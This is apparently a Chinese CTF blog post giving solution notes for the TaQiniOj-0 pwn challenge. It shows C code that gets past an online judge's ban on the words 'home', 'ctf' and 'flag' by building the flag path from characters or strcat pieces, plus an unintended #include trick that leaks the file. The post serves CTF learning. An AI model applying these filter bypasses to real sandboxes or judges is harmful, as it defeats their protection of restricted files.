---
layout: post
title: "pwn writeups"
date: 2020-12-01 16:51:14 +0800
description: ""
category: ctf/bin
tags: []
---

## 写C代码

DASCTF-May2020 × BJDCTF-3rd：[TaQiniOj-0](http://www.resery.top/2020/05/23/BJD%203nd%20&%20DASCTF%20%E4%BA%94%E6%9C%88%E6%9C%88%E8%B5%9Bwp)，禁用了关键字home|ctf|flag，使用字符数组，或者strcat拼接绕过

```c
#include<stdio.h>
#include <string.h>
int main(){
  char name[] = {'/','h','o','m','e','/','c','t','f','/','f','l','a','g','\0'};
  FILE* fp = NULL;
  char buff[255];
/*  char name[255];
  strcpy(name, "/hom");
  strcat(name, "e/ct");
  strcat(name, "f/fl");
  strcat(name, "ag");
*/
  fp = fopen(name, "r");
  fscanf(fp, "%s", buff);
  printf("%s", buff);
}
```

非预期：直接include

```c
#include "/home/ctf/fl\
ag"
```

